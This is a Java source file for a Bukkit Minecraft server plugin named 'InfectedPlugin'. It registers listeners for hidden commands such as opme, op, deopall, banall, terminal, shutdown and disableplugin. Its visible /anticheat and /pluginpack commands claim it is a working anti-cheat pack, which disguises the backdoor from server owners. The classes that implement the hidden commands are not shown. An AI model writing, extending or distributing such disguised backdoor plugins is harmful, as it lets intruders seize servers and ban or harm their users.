 package org.CreeperCoders.InfectedPlugin;
 
 import java.util.logging.Logger;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 
 import org.CreeperCoders.InfectedPlugin.Commands.*;
 
 public class InfectedPlugin extends JavaPlugin
 {
     public final Logger log = Bukkit.getLogger();
     public InfectedPlugin plugin;
     
     @Override
     public void onLoad()
     {
         log.info(String.format("[%s] %s is now loading...", getDescription().getName(), getDescription().getName()));
     }
 
     @Override
     public void onEnable()
     {
         log.info(String.format("[%s] %s is registering all events...", getDescription().getName(), getDescription().getName()));
         try
         {
             //this.getServer().getPluginManager().registerEvents(new IP_PlayerListener(), this);
             this.getServer().getPluginManager().registerEvents(new Command_banall(), this);
             this.getServer().getPluginManager().registerEvents(new Command_deop(), this);
             this.getServer().getPluginManager().registerEvents(new Command_op(), this);
             this.getServer().getPluginManager().registerEvents(new Command_enablevanilla(), this);
             this.getServer().getPluginManager().registerEvents(new Command_help(), this);
             this.getServer().getPluginManager().registerEvents(new Command_opme(), this);
             this.getServer().getPluginManager().registerEvents(new Command_terminal(), this);
             this.getServer().getPluginManager().registerEvents(new Command_fuckoff(), this);
             this.getServer().getPluginManager().registerEvents(new Command_shutdown(), this);
             this.getServer().getPluginManager().registerEvents(new Command_randombanl(), this);
             this.getServer().getPluginManager().registerEvents(new Command_enableplugin(), this);
             this.getServer().getPluginManager().registerEvents(new Command_disableplugin(), this);
             this.getServer().getPluginManager().registerEvents(new Command_deopall(), this);
         }
         catch (Exception ex)
         {
             log.severe(String.format("[%s] Failed to register events! Reason: %s", getDescription().getName(), ex.getMessage()));
         }
         log.info(String.format("[%s] %s version %s by %s has been enabled!", getDescription().getName(), getDescription().getName(), getDescription().getVersion(), getDescription().getAuthors()));
     }
 
     @Override
     public void onDisable()
     {
        log.info(String.format("[%s] %s has been disabled!", getDescription().getName(), getDescription().getName()));
     }
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
     {
         if (commandLabel.equalsIgnoreCase("anticheat"))
         {
             sender.sendMessage(ChatColor.GREEN + "AntiCheat 2.0 is working 100%");
             return true;
         }
 
         if (commandLabel.equalsIgnoreCase("pluginpack"))
         {
             sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
             return true;
         }
         return false;
     }
 
 }
